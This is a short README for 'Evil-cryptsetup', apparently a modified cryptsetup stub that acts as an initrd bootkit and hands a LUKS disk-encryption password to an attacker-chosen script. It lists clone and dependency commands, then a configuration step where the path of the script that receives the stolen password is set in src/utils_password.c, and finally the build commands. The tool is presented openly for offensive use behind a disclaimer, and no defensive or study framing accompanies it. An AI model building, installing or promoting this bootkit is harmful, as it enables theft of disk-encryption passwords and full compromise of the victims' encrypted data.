# Evil-cryptsetup -- LUKS password-stealing initrd bootkit

A minimal  cryptsetup  stub  for  initrd that passes the LUKS  password to a custom  script.


# Warning!
### Use it at your own risk. The author is not responsible for the use of this tool.
## Installation
Clone git repository and install dependencies:
```
git clone https://github.com/armv7-mmio/evil-cryptsetup 
cd ./evil-cryptsetup
```
**For Fedora**:
```
git gcc make autoconf automake gettext-devel pkgconfig openssl-devel popt-devel device-mapper-devel libuuid-devel json-c-devel libblkid-devel findutils libtool libssh-devel tar rubygem-asciidoctor
```
To run the internal testsuite (make check) you also need to install
```
sharutils device-mapper jq vim-common expect keyutils netcat shadow-utils openssh-clients openssh sshpass
```

**For Debian and Ubuntu**:
```
git gcc make autoconf automake autopoint pkg-config libtool gettext libssl-dev libdevmapper-dev libpopt-dev uuid-dev libsepol-dev libjson-c-dev libssh-dev libblkid-dev tar asciidoctor

Optionally: libargon2-0-dev libpwquality-dev
```
To run the internal testsuite (make check) you also need to install
```
sharutils dmsetup jq xxd expect keyutils netcat-openbsd passwd openssh-client sshpass
```
## Configuration
Edit *src/utils_password.c* and set the path to script that will receive stolen password:
```
#define SCRIPT "./your_script"
```
## Buld & Testing
For config and build:
 ```./autogen.sh && ./configure && make```

 ## License & Credits
 **License:** GPL-2.0
 **Original author:** Milan Broz mbroz *https://github.com/mbroz*
